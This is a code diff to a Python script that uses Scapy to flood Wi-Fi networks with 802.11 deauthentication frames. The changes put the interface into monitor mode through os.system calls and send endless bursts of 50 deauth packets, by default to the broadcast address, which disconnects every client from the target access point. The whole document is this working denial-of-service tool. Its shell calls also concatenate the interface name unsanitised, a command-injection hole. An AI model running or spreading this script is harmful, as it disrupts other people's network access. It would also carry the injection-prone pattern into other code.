@@ -1,5 +1,6 @@
 import time
 import sys
+import os
 from scapy.all import *
 from optparse import OptionParser
 
@@ -30,9 +31,14 @@ if t_type == None:
 elif c_mac == None:
     c_mac = "ff:ff:ff:ff:ff:ff"
 
+os.system("ifconfig "+iface+" down")
+os.system("iwconfig "+iface+" mode monitor")
+os.system("ifconfig "+iface+" up")
 
-pkt = RadioTap()/Dot11(subtype=0x00c,addr1=bssid,addr2=c_mac,addr3=c_mac)/Dot11Deauth(reason=t_type)
+pkt = RadioTap()/\
+Dot11(subtype=0x00c,addr1=bssid,addr2=c_mac,addr3=c_mac)/\
+Dot11Deauth(reason=t_type)
 
 while True:
-    print "Sending deauth to %s"%c_mac
-    sendp(pkt,iface=iface)
+    for i in range(0,50):
+        sendp(pkt,iface=iface)
